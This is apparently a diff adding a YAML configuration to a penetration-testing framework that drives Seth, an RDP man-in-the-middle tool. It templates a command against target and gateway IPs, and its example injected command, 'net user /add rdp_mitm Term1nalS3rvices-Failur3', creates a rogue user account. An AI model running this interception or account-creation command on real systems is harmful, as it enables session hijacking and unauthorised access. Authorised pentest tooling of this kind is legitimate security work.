@@ -1,0 +1,53 @@
+tool author: "https://github.com/SySS-Research/Seth"
+config_creator: "huber"
+tool_name: "seth"
+simultaneous: True
+group_by: "target"
+targets:
+      scope: "SINGLE_SCOPE_IP"
+target_by_host_file: True
+command: "SETH_DEBUG=1 <seth_path> <your_interface> <your_ip_address> <target_ip> <gateway_ip> <command> > OUTPUT_FOLDER/FORMATTED_ENTRY__sSCOPE_ID.txt"
+output_path: "output/attack/seth/"
+tool_parser: "parsers.attack.seth_parser.seth_parser"
+check_already_run: False
+create_folder: True
+
+# Global Vars
+seth_path: '$PENTEST_DIR$/seth/seth.sh'
+
+questions:
+      - question: "Seth full path (ex. /pentest/seth/seth.sh)"
+        name: "seth_path"
+        nullable: False
+        regex:
+        global: True
+        answers:
+          default: "/pentest/seth/"
+          blank: "/pentest/seth/"
+      - question: "Network Interface IP"
+        name: "your_ip_address"
+        nullable: False
+        options: "NETWORK_IP_ADDRESS"
+        regex:
+        global: True
+      - question: "Network Interface Name"
+        name: "your_interface"
+        nullable: False
+        options: "NETWORK_INTERFACE_NAME"
+        regex:
+        global: True
+      - question: "Target IP (doing RDP)"
+        name: "target_ip"
+        nullable: False
+        regex:
+        global: True
+      - question: "RDP Server / Gateway IP"
+        name: "gateway_ip"
+        nullable: False
+        regex:
+        global: True
+      - question: "Command (to run) (ex. net user /add rdp_mitm Term1nalS3rvices-Failur3)"
+        name: "command"
+        nullable: False
+        regex:
+        global: False
